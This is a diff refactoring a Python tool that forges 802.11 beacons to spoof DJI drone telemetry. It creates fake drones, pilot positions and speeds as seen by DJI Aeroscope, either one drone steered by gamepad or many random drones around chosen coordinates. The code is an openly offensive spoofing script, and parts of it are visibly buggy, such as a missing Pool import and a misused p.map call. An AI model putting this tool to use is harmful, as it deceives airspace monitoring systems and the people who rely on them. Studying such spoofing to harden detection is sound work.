@@ -1,27 +1,20 @@
-from Beacon import *
+
 import struct
-import sys, getopt, argparse
-from scapy.sendrecv import sendp
-import random, string
-from math import floor, sqrt
-import time, os, calendar
+import sys
+import argparse
+import random
+import time
+import calendar
 import threading
-from Drone import *
+from math import floor, sqrt
 from scapy.utils import PcapWriter
-import inputs
-from inputs import get_key
-import multiprocessing
+from scapy.sendrecv import sendp
+from inputs import get_key, devices
+from Beacon import *
+from Drone import *
 
 MAX_TRIGGERS = 1023
 MAX_JXY = 32767
-
-
-#### TODO
-#   Send in parallel different queues
-#
-
-
-
 
 '''
    Assemble the DJI payload to a 802.11 beacon packet
@@ -38,7 +31,6 @@ def create_packet(beacon_base, payload):
 
     return packet
 
-
 '''
 Update the DJI Vendor ID info from the Scapy Beacon object
 '''
@@ -51,8 +43,6 @@ def update_packet(prev_packet, new_payload):
     #is the last Vendor Specific tag... in case we added the Microsoft Vendor Tag
     prev_packet[Dot11EltVendorSpecific][len([prev_packet[Dot11EltVendorSpecific]])-1].payload = new_tag_vendor_dji
     return prev_packet
-
-
 
 is_finish = 0
 '''
@@ -67,8 +57,7 @@ def thread_send(d: Drone, beacon_base_packet):
     packet = create_packet(beacon_base_packet, old_payload) # build first packet ever
 
     #packets_txt.write(packet_list[1][Dot11EltVendorSpecific][len([packet_list[1][Dot11EltVendorSpecific]])-1].show(dump=True))
-    while is_finish == 0:
-        
+    while is_finish == 0:        
         time.sleep(0.5)
         try:
             new_payload = d.build_telemetry()
@@ -92,7 +81,6 @@ def thread_send(d: Drone, beacon_base_packet):
             break
 
     print("Exiting Thread. Packet sent {} times".format(count))
-
 
 def normalize(value, max=MAX_TRIGGERS, minimum=1):
     n = (value - minimum) / (max - minimum)
@@ -140,13 +128,11 @@ def process_event(drone, axis, value, ev_type):
     elif axis == "HAT0X" : # Modify Longitude
         
         print("Update Pilot longitude")
-
         drone.update_pilot_longitude(value_sign)
             
     elif axis == "HAT0Y": # Modify Latitude
         
         print("Update Pilot latitude")
-
         drone.update_pilot_latitude(value_sign)
         
     elif axis == "RY":
@@ -163,7 +149,7 @@ def process_event(drone, axis, value, ev_type):
         # modify yaw
         drone.update_yaw(value_sign)
 
-    # Change speed to show 3 different colors.
+    # Change speed: Aeroscope shows 3 different colors according to speed
     elif axis == "TL" and value == 1: # Skip when button released event.
         
         drone.v_east =  (drone.v_east + 200) % 2500# speed is divided by 100 in the aeroscope.If we want to increase 1 in the aeroscope, we add 100 here
@@ -192,10 +178,9 @@ def process_event(drone, axis, value, ev_type):
     
     return True
 
-
 def get_gamepad():
     try:
-        joystick = inputs.devices.gamepads[0]
+        joystick = devices.gamepads[0]
         print("Gamepad assigned")
     except IndexError:
         print("No gamepad found")
@@ -290,9 +275,6 @@ def one_drone():
         # sendp(packet_list, iface=interface, loop=1, inter=0.5)
 
 
-
-
-
 def random_spoof(n, multi=False, point=None):
     
     n_drones = n
@@ -331,47 +313,49 @@ def random_spoof(n, multi=False, point=None):
         with Pool(5) as p:
             p.map(sendp(packet_list, iface=interface, loop=1, inter=1))
 
-
 '''
 =====================================================================
 Main
-Arguments indicate whether to spoof a single specific drone or N random drones (around a given point)
+indicate whether to spoof a single specific drone or N random drones (around a given point)
 =====================================================================
 '''
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--interface", help="Spoof on drone. poofing parameters are set by the user.")
+    parser.add_argument("-m", "--multi", help="Test multiprocessing")
 
-parser = argparse.ArgumentParser()
-parser.add_argument("-i", "--interface", help="Spoof on drone. poofing parameters are set by the user.")
-parser.add_argument("-m", "--multi", help="Test multiprocessing")
+    parser.add_argument("-r", "--random", help="Spoof randomly N drones")
+    parser.add_argument("-a", "--area", help="Define point where drones will be spoofed eg: -a '46.76 7.62 '")
 
-parser.add_argument("-r", "--random", help="Spoof randomly N drones")
-parser.add_argument("-a", "--area", help="Define point where drones will be spoofed eg: -a '46.76 7.62 '")
+    args = parser.parse_args()
+    print("Arguments: {}".format(args))
 
-args = parser.parse_args()
-print("Arguments: {}".format(args))
+    if not args.interface:
+        raise SystemExit(
+    "Usage: {sys.argv[0]} -i  <interface> [-r] <number of drones> [-a] <'latitude longitude'> \n \
+    -r N            Spoof N random drones around the map. \n \
+    -a 'lat long'     If set, drones are spoofed around point \n \
+    Interface must be in monitor mode")
 
-if not args.interface:
-    raise SystemExit(
-"Usage: {sys.argv[0]} -i  <interface> [-r] <number of drones> [-a] <'latitude longitude'> \n \
--r N            Spoof N random drones around the map. \n \
--a 'lat long'     If set, drones are spoofed around point \n \
-Interface must be in monitor mode")
+    else:
+        interface = args.interface
+        if args.multi:
+            multi = True
+        if args.random : # Consider fail when you pass 0 drones... ToDo
+            n_random = args.random
+            
+            print("Spoofing {} drones".format(n_random))
+            if args.area:
+                point = args.area.split()
+                print(point)
+                random_spoof(n_random, point)
+                raise SystemExit("END")
 
-else:
+            random_spoof(n_random) # random drones around the whole world by default
 
-    interface = args.interface
-    if args.multi:
-        multi = True
-    if args.random : # Consider fail when you pass 0 drones... ToDo
-        n_random = args.random
-        
-        print("Spoofing {} drones".format(n_random))
-        if args.area:
-            point = args.area.split()
-            print(point)
-            random_spoof(n_random, point)
-            raise SystemExit("END")
+        else: #Spoof only one drone that can change location
+            one_drone()
 
-        random_spoof(n_random)
 
-    else: #Spoof only one drone
-        one_drone()
+if __name__ == "__main__":
+    main()
